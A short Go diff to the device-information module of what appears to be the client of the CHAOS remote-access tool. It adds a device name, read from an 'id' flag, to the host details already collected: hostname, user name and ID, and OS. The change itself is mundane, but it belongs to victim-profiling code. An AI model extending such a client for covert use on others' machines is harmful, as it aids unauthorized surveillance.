@@ -1,13 +1,15 @@
 package information
 
 import (
-	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"github.com/tiagorlampert/CHAOS/client/app/services"
-	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
+	"flag"
 	"os"
 	"os/user"
 	"runtime"
 	"time"
+
+	"github.com/tiagorlampert/CHAOS/client/app/entities"
+	"github.com/tiagorlampert/CHAOS/client/app/services"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 )
 
 type Service struct {
@@ -23,6 +25,14 @@ func (i Service) LoadDeviceSpecs() (*entities.Device, error) {
 	if err != nil {
 		return nil, err
 	}
+	p := flag.Lookup("id")
+
+	var devname = ""
+
+	if p != nil {
+		devname = p.Value.String()
+	}
+
 	username, err := user.Current()
 	if err != nil {
 		return nil, err
@@ -33,6 +43,7 @@ func (i Service) LoadDeviceSpecs() (*entities.Device, error) {
 	}
 	return &entities.Device{
 		Hostname:       hostname,
+		Devicename:     devname,
 		Username:       username.Name,
 		UserID:         username.Username,
 		OSName:         runtime.GOOS,
